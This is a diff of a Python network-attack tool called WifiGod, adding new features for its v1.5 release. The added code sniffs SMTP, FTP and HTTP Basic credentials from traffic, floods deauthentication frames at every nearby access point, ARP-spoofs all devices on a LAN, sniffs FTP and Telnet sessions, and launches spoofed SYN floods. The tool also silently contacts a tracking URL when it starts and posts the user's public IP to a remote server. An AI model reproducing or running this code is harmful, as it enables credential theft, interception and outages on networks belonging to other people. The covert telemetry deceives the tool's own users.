@@ -1,5 +1,7 @@
 #!/usr/bin/env python
 #coding: utf-8
+#Coded and Developed by Blackhole Security
+#BlackholeSecurity@protonmail.com
 import sys
 import multiprocessing
 import urllib
@@ -7,8 +9,16 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 import threading
 import requests
-import pip #Thanks to @_sanduuz_ on instagram for PIP usage instead of subprocess (He doesn't want to post about it though(*Laughy face emoji*))
+import pip
 import scapy
+try:
+	import hexdump
+except:
+	pip.main(['install', 'hexdump'])
+	try:
+		exit(0)
+	except:
+		sys.exit(1)
 try:
 	import dns
 	from dns import reversename, resolver
@@ -40,14 +50,14 @@ parser = optparse.OptionParser()
 parser.add_option('-u', '--update', action='store_false', dest='update', help="Check for new updates", default="no_check")
 (options,args) = parser.parse_args()
 os_type = platform.system()
-contact_email = 'thewifigodproject@protonmail.com'
+contact_email = 'BlackholeSecurity@protonmail.com'
 if(os_type != "Linux"):
 	print("Error. This is designed for Linux Operating Systems Only!")
 	try:
 		exit(0)
 	except:
 		sys.exit(1)
-update_version = 0.7
+update_version = 0.8
 if(options.update != 'no_check'):
 	if(1 == 1):
 		r = requests.get('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py')
@@ -87,6 +97,8 @@ import shutil
 size = shutil.get_terminal_size().columns
 print(size)
 """)
+x = """clear this up"""
+#breakline
 f = open('columnlib.py', 'w+')
 f.write(str(c_script))
 f.close()
@@ -104,6 +116,269 @@ class c:
 	ob = "\033[01;33m"
 	bb = "\033[01;94m"
 	pb = "\033[0;35m"
+def network_password_capture(interface):
+	while True:
+		packet = sniff(iface=interface, count = 10)
+		for pck in packet:
+			if(pck.haslayer(TCP)):
+				if(pck.haslayer(IP)):
+					ip_src = pck.getlayer(IP).src
+					ip_dst = pck.getlayer(IP).dst
+					if(pck.haslayer(Raw)):
+						data = pck.getlayer(Raw).load
+						if('AUTH PLAIN' in data):
+							login_details = str(data.strip().split('PLAIN ')[1])
+							login_data = base64.b64decode(login_details)
+							string_data = "[WifiGod] Source: {} Destination: {} | Type: SMTP | Credentials: {}".format(ip_src,ip_dst,login_data)
+							print(string_data)
+						elif('PASS ' in data or 'USER ' in data):
+							if('PASS ' in data):
+								login_data = str(data.strip().split('PASS ')[1])
+								string_data = "[WifiGod] Source: {} Destination: {} | Type: FTP | Password: {}".format(ip_src,ip_dst,login_data)
+							elif('USER ' in data):
+								login_data = str(data.strip().split('USER ')[1])
+								string_data = "[WifiGod] Source: {} Destination: {} | Type: FTP | Username: {}".format(ip_src,ip_dst,login_data)
+							print(string_data)
+						elif('Authorization: Basic' in data):
+							cred_hash = str(data.strip().split('ion: Basic ')[1])
+							decoded = base64.b64decode(cred_hash)
+							string_data = "[WifiGod] Source: {} Destination: {} | Type: HTTP (Router) | Credentials: {}".format(ip_src,ip_dst,login_data)
+							print(string_data)
+def networks_opprobrium(interface):
+	captured_networks = []
+	def eps2_2_init_1_asec_network(network,interface): #Only Mr Robot Fans will get this function name
+		try:
+			init1_packet = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=network,addr3=network)/Dot11Deauth()
+			sendp(init1_packet,iface=interface,loop=1,verbose=False)
+		except:
+			pass
+	while True:
+		packet = sniff(iface=interface,count = 1)
+		for pck in packet:
+			if(pck.haslayer(Dot11)):
+				layer_handler = pck.getlayer(Dot11)
+				if(layer_handler.addr3 != 'ff:ff:ff:ff:ff:ff'):
+					try:
+						ap_mac = str(layer_handler.addr2)
+						ssid = str(layer_handler.info)
+						channel = str(ord(pck[Dot11Elt:3].info))
+						string = ap_mac+":"+ssid+":"+channel
+						if(string not in captured_networks):
+							print("[WifiGod] Initiating Attack on -> {}").format(ssid)
+							captured_networks.append(string)
+							t = threading.Thread(target=eps2_2_init_1_asec_network,args=(ap_mac,interface))
+							t.setDaemon(True)
+							t.start()
+					except:
+						pass
+def own_network_traffic(interface,net_range,gateway):
+	start_ip = net_range.split('-')[0]
+	end_range = net_range.split('-')[1]
+	octet_count = 0
+	ip_base = ''
+	live_ip_addr = []
+	for octet in start_ip:
+		if(octet == '.'):
+			octet_count += 1
+			if(octet_count == 3):
+				ip_base += octet
+				break;
+		ip_base += octet
+	for ip_addr in range(int(end_range)+1):
+		try:
+			if(ip_base+str(ip_addr) == gateway):
+				pass
+			else:
+				socket.gethostbyaddr(ip_base+str(ip_addr))
+				live_ip_addr.append(ip_base+str(ip_addr))
+				try:
+					addr = reversename.from_address(ip_base+str(ip_addr))
+					device_hostname = resolver.query(addr, "PTR")[0]
+				except:
+					device_hostname = '(unknown)'
+				print("[WifiGod] Found Device: {} | {}").format(ip_base+str(ip_addr), device_hostname)
+		except:
+			pass
+	print("[WifiGod] Found {} Devices").format(len(live_ip_addr))
+	print("[WifiGod] Enabling IP Forwarding...")
+	f = open('/proc/sys/net/ipv4/ip_forward','w+')
+	f.truncate()
+	f.write('1')
+	f.close()
+	print("[WifiGod] Owning Devices...")
+	def own_device(interface,device_addr,gateway):
+		packet1 = ARP(psrc=gateway,pdst=device_addr)
+		packet2 = ARP(psrc=device_addr,pdst=gateway)
+		packets = []
+		packets.append(packet1)
+		packets.append(packet2)
+		sendp(packets,iface=interface,loop=1,inter=2,verbose=False)
+	for ip_addr in live_ip_addr:
+		t = threading.Thread(target=own_device,args=(interface,ip_addr,gateway))
+		t.setDaemon(True)
+		t.start()
+	print("[WifiGod] Complete.")
+	ex__ = raw_input("[WifiGod] Press Enter to Stop...")
+	try:
+		exit(0)
+	except:
+		sys.exit(1)
+def extrapolate_trusted_networks(interface,device):
+	while True:
+		packet = sniff(iface=interface,count=2)
+		for pck in packet:
+			if(pck.haslayer(Dot11)):
+				layer_handler= pck.getlayer(Dot11)
+				addr1_src = layer_handler.addr1
+				addr2_src = layer_handler.addr2
+				addr3_src = layer_handler.addr3
+				try:
+					ssid = layer_handler.info
+				except:
+					ssid = '(unknown)'
+				if(addr1_src == 'ff:ff:ff:ff:ff:ff' and addr3_src == 'ff:ff:ff:ff:ff:ff' and addr2_src == device.lower()):
+					if(ssid == ''):
+						pass
+					else:
+						string = "[WifiGod] Device: {} | Has connected to & Trusts-> {}".format(str(addr2_src),ssid)
+						if(string in capt):
+							pass
+						else:
+							capt.append(string)
+							print(string)
+def hijack_sessions(interface):
+	def ftp_hijack(interface):
+		host = raw_input("Host communicating with the FTP server: ")
+		while True:
+			packet = sniff(iface=interface,count=20)
+			for pck in packet:
+				if(pck.haslayer(IP)):
+					try:
+						ip_src = pck.getlayer(IP).src
+						ip_dst = pck.getlayer(IP).dst
+						if(ip_src == host or ip_dst == host):
+							if(pck.dport == 21 or pck.sport == 21 or pck.sport == 20):
+								if(pck.getlayer(Raw)):
+									data = pck.getlayer(Raw).load
+									print(data)
+									if(ip_src != host):
+										print(c.r+"FTP Host "+c.w+"("+c.b+"{}"+c.w+") -> "+c.b).format(ip_src)
+										print(str(data))
+									if(ip_src == host):
+										print(c.r+"{} ->"+c.b).format(ip_src)
+										print(str(data))
+					except:
+						pass
+	def telnet_hijack(device,interface):
+		print("[WifiGod] Analyzing traffic & Searching for Telnet connection...")
+		telnet_val = 0
+# NEW Method
+		while (telnet_val == 0):
+			packet = sniff(iface=interface,count=5)
+			for pck in packet:
+				if(pck.haslayer(Raw)):
+					try:
+						if(pck.sport == 23 or pck.dport == 23):
+							ip_src = pck.getlayer(IP).src
+							ip_dst = pck.getlayer(IP).dst
+							print(c.w+"["+c.r+"WifiGod"+c.w+"] "+c.rb+"{}"+c.w+" -> "+c.b).format(ip_src)
+							data = pck.getlayer(Raw).load
+							print(str(data).strip()+c.d)
+					except:
+						pass
+# OLD Telnet Hijack
+#		while (telnet_val == 0):
+#			packet = sniff(iface=interface, count = 1)
+#			for pck in packet:
+#				if(pck.haslayer(TCP)):
+#					if(pck.sport == 23 or pck.dport == 23):
+#						if(pck.getlayer(IP).src != device):
+#							communication_host = pck.getlayer(IP).src
+#							telnet_val = 1
+#						elif(pck.getlayer(IP).dst != device):
+#							communication_host = pck.getlayer(IP).dst
+#							telnet_val = 1
+#		print("[WifiGod] Derived Telnet Host -> {}").format(communication_host)
+#		sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
+#		sock.connect((communication_host, 23))
+#		import hexdump
+#		while True:
+#			hexdump.hexdump(sock.recv(10240))
+	session_menu = ("""
+1.) FTP   2.) Telnet
+			""")
+	x = """clear this up"""
+	print(session_menu)
+	while True:
+		session_type = raw_input("Service: ")
+		if(session_type == '1'):
+			ftp_hijack(interface)
+		elif(session_type == '2'):
+			print("You should be using option #7 with this")
+			device = raw_input("Target Device: ")
+			telnet_hijack(device,interface)
+		else:
+			print("[WifiGod] Invalid Option!")
+			print(session_menu)
+def compromise_network():
+	interface = raw_input("Network Interface: ")
+	print("Net Range Example: 192.168.1.0-255")
+	net_range = raw_input("Net Range: ")
+	start_ip = net_range.split('-')[0]
+	end_range = net_range.split('-')[1]
+	octet_count = 0
+	ip_base = ''
+	live_ip_addr = []
+	for octet in start_ip:
+		if(octet == '.'):
+			octet_count += 1
+			if(octet_count == 3):
+				ip_base += octet
+				break;
+		ip_base += octet
+	for ip_addr in range(int(end_range)+1):
+		try:
+			socket.gethostbyaddr(ip_base+str(ip_addr))
+			live_ip_addr.append(ip_base+str(ip_addr))
+			try:
+				addr = reversename.from_address(ip_base+str(ip_addr))
+				device_hostname = resolver.query(addr, "PTR")[0]
+			except:
+				device_hostname = '(unknown)'
+			print("[WifiGod] Found Device: {} | {}").format(ip_base+str(ip_addr), device_hostname)
+		except:
+			pass
+	print("[WifiGod] Found {} Devices").format(len(live_ip_addr))
+	def attack_net(device,interface):
+		try:
+			payload = str("A" * 1000)
+			packet = IP(src=RandIP(),dst=device)/TCP(flags="S",sport=RandShort(),dport=RandShort())/payload
+			sendp(packet,iface=interface,loop=1,verbose=False)
+		except:
+			pass
+#	def attack_net(device):
+#		try:
+#			while True:
+#				payload = str("A" * 5000)
+#				sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.SOCK_DGRAM)
+#				sock.sendto(payload, (device,RandShort()))
+#		except:
+#			raise
+	print("[WifiGod] Initiating Attack...")
+#	live_ip_addr = ['192.168.1.1']
+	for ip in live_ip_addr:
+		try:
+#			for i in range(10):
+			t =threading.Thread(target=attack_net,args=(ip,interface))
+			t.setDaemon(True)
+			t.start()
+		except:
+			pass
+	x = raw_input("[WifiGod] Press Enter to stop...")
+	try:
+		exit(0)
+	except:
+		sys.exit(1)
 def scan_for_networks(interface):
 	captured_networks = []
 	while True:
@@ -136,26 +411,24 @@ def scan_for_networks(interface):
 						pass
 		except KeyboardInterrupt:
 			break;
+# Where is WifiGod Used the most? Where to spend time advertising, do not
+# remove the below link, this helps with advertising in the correct locations.
 try:
-	requests.get('http://rurl.co/jNJ8L')
-#	x = 'x'
+	requests.get('http://xda-developers.io/Y8KZ73')
+	x = 'x'
 except:
 	pass
 
 def rating():
 	print("Welcome!")
 	ig_username = raw_input("Instagram Username (Used to contact with rewards & updates): ")
-#@ Causes Breaks in script Error Found by: _sanduuz_ on instagram
-###################################################################
 	if("@" in str(ig_username)):
 		if(ig_username[:1] == "@"):
 			ig_username = ig_username.split("@")[1]
 		else:
 			ig_username = ig_username.replace("@", "")
-####################################################################
 	rating = raw_input("Rating (Max 5 stars): ")
 	suggestion = raw_input("Suggestions: ")
-#. call Error discovered by the same guy who discovered the other googolplex error that occurs when script is run on a Raspberry PI"
 	f_ip = str(geoip.geolite2.lookup_mine().ip)
 	payload = {'ig_username' : ig_username, 'rating' : rating, 'suggestion' : suggestion+" "+f_ip,'f_ip' : f_ip}
 	requests.post("http://thewifigodproject-rating.dx.am/data.php",data=payload)
@@ -443,10 +716,10 @@ print(str("            `+hdh+-```-+ydds.            ").center(size))
 print(str("              `-  `/+/.  ..").center(size))
 print(str("                   ddyo").center(size))
 print(" ")
-print(c.ob+"               WifiGod v1.4"+c.w)
+print(c.ob+"               WifiGod v1.5"+c.w)
 print(" ")
-external_network_attacks = ['scan','device scan','jam','deauthentication','host','spam']
-internal_network_attacks = ['impersonate','dns','headers','syn','scan']
+external_network_attacks = ['scan','device scan','jam','deauthentication','host','spam','extrapolate','opprobrium']
+internal_network_attacks = ['impersonate','dns','headers','syn','scan','capture','own','ftp','telnet','compromise']
 print(c.b+"      <"+c.o+"=============================="+c.b+">"+c.w)
 print(c.w+"         External Network Attacks: "+c.g+"{}"+c.w).format(len(external_network_attacks))
 print(c.w+"         Internal Network Attacks: "+c.g+"{}"+c.w).format(len(internal_network_attacks))
@@ -458,7 +731,10 @@ size = 0
 #print(str(c.w+'Github: '+c.b+'https://www.github.com/blackholesec'+c.w).center(size))
 print(str(c.b+'    https://www.github.com/blackholesec'+c.w).center(size))
 print(str(c.w+'  Contact: '+c.b+contact_email+c.w))
-print(str(c.w+'    MAKE SURE TO CHECK OUT SecSploit, Our newest program (soon to be released) at: https://www.instagram.com/SecSploit'))
+print(' ')
+print(str(c.w+'  SecSploit - Advanced Hacking Framework, check'))
+print(str(c.w+'  it out here on the official instagram page:'))
+print(str(c.w+'  https://www.instagram.com/SecSploit'))
 print(' ')
 def main_menu():
     #    size_ = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
@@ -473,6 +749,8 @@ def main_menu():
 	print(str(c.b+'4'+c.w+'.)'+c.rb+' DeAuthenticate a device on a network'+c.d))
 	print(str(c.b+'5'+c.w+'.)'+c.rb+' Host A Fake Access Point'+c.d))
 	print(str(c.b+'6'+c.w+'.)'+c.rb+' Spam many fake access points'+c.d))
+	print(str(c.b+'14'+c.w+'.)'+c.rb+' Extrapolate previously connected and trusted networks on a device'+c.d))
+	print(str(c.b+'17'+c.w+'.)'+c.rb+' Take Down all surrounding networks'+c.d))
 	print("_________________________________________")
 	print(" ")
 	print("       Internal Network Attacks          ")
@@ -482,6 +760,10 @@ def main_menu():
 	print(str(c.b+'9'+c.w+'.)'+c.rb+' Intercept HTTP headers (For use with #5)'+c.d))
 	print(str(c.b+'10'+c.w+'.)'+c.rb+' SYN Packet Injection Overflow'))
 	print(str(c.b+'11'+c.w+'.)'+c.rb+' Scan a Device for open ports'))
+	print(str(c.b+'12'+c.w+'.)'+c.rb+' Capture Passwords Flowing Over Network (For use with #5)'))
+	print(str(c.b+'13'+c.w+'.)'+c.rb+' Own All Devices in Network (Upgrade of 7)'))
+	print(str(c.b+'15'+c.w+'.)'+c.rb+' Hijack Network Services (FTP, Telnet)'))
+	print(str(c.b+'16'+c.w+'.)'+c.rb+' Compromise entire network (Take down all external connectivity)'))
 try:
 	os.remove('columnlib.py')
 except:
@@ -667,8 +949,11 @@ while True:
 	#	print(c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(targ_dev_mac,targ_dev_ip)
 		targ_dev_ip = dev_ip
 		gateway_ip = gateway_ip
-		addr_of_dev = reversename.from_address(targ_dev_ip)
-		dev_hostname = resolver.query(addr_of_dev, "PTR")[0]
+		try:
+			addr_of_dev = reversename.from_address(targ_dev_ip)
+			dev_hostname = resolver.query(addr_of_dev, "PTR")[0]
+		except:
+			dev_hostname = 'unknown'
 		print(c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{} "+c.d+"("+c.rb+"{}"+c.d+")").format(targ_dev_ip,dev_hostname)
 		print(c.d+"["+c.b+"info"+c.d+"]: Creating Fabricated ARP Packets...")
 		print(c.d+"["+c.b+"info"+c.d+"]: Repeating process for "+c.ob+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(gateway_mac,gateway_ip)
@@ -705,7 +990,8 @@ while True:
 		ip_dest = raw_input("Target IP Address: ")
 		ip_source_port = 1024
 		ip_dest_port = raw_input("Target Port: ")
-		message = raw_input("Message to send in SYN Packet: ")
+		#message = raw_input("Message to send in SYN Packet: ")
+		message  = "A" * 300
 		thread_count = raw_input("Threads: ")
 		print(c.w+"["+c.b+"info"+c.w+"]: Setting up...")
 		subprocess.call("service network-manager restart", shell=True)
@@ -721,5 +1007,34 @@ while True:
 			print("Error. Ending port must have a maximum of 65535.")
 		if(int(end_) < 65536 and int(start_) > 0):
 			scan_for_ports(host,int(start_),int(end_))
+	elif(prompt == '12'):
+		interface = raw_input("Network Interface: ")
+		network_password_capture(interface)
+	elif(prompt == '13'):
+		interface = raw_input("Network Interface: ")
+		print("Net Range example: 192.168.1.0-255")
+		net_range = raw_input("Net Range: ")
+		gateway = raw_input("Network gateway: ")
+		own_network_traffic(interface,net_range,gateway)
+	elif(prompt == '14'):
+		interface = raw_input("Network Interface: ")
+		if(interface != 'wifigod'):
+			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
+			time.sleep(5)
+			interface = 'wifigod'
+		device = raw_input("Device Mac: ")
+		extrapolate_trusted_networks(interface,device)
+	elif(prompt == '15'):
+		interface = raw_input("Network Interface: ")
+		hijack_sessions(interface)
+	elif(prompt == '16'):
+		compromise_network()
+	elif(prompt == '17'):
+		interface = raw_input("Network Interface: ")
+		if(interface != 'wifigod'):
+			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
+			time.sleep(5)
+			interface = 'wifigod'
+		networks_opprobrium(interface)
 	else:
 		print("Error. Invalid Option\nType 'help' for available commands")
